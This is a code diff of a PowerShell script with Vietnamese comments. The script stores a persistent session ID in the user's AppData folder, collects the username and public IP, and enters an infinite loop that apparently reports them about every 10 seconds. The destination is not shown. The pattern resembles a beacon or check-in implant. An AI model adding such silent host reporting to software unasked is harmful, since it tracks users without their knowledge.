@@ -2,22 +2,20 @@ $sessionFile = "$env:APPDATA\session_id.txt"
 
 # Tạo session_id nếu chưa có
 if (!(Test-Path $sessionFile)) {
-    $guid = [guid]::NewGuid().ToString()
+    $guid = [guid]::NewGuid().ToString("N").Substring(0, 16)
     Set-Content -Path $sessionFile -Value $guid
 }
-$sessionId = Get-Content -Path $sessionFile -Raw
 
-# Lấy username
-$username = $env:USERNAME
+# Luôn ép kiểu chuỗi cho chắc
+$sessionId = (Get-Content -Path $sessionFile -Raw).ToString()
+$username  = $env:USERNAME.ToString()
 
-# Lấy IP công cộng
 try {
-    $ip = (Invoke-RestMethod "https://api.ipify.org?format=json").ip
+    $ip = (Invoke-RestMethod "https://api.ipify.org?format=json").ip.ToString()
 } catch {
     $ip = "0.0.0.0"
 }
 
-# Gửi dữ liệu định kỳ mỗi 10s
 while ($true) {
     $body = @{
         session  = $sessionId
